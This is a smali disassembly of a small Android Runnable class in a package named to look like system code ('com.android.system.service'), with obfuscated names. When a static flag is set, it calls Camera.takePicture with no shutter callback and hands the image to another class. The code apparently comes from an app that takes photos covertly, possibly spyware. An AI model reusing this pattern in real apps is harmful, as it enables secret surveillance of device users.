.class Lcom/android/system/service/o$b;
.super Ljava/lang/Object;
.source ""
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/system/service/o;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    sget-boolean v0, Lcom/android/system/service/o;->a:Z

    if-nez v0, :cond_0

    return-void

    :cond_0
    sget-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    if-nez v0, :cond_1

    return-void

    :cond_1
    const/4 v1, 0x0

    const/4 v2, 0x0

    new-instance v3, Lcom/android/system/service/o$a;

    invoke-direct {v3}, Lcom/android/system/service/o$a;-><init>()V

    invoke-virtual {v0, v1, v2, v3}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    return-void
.end method
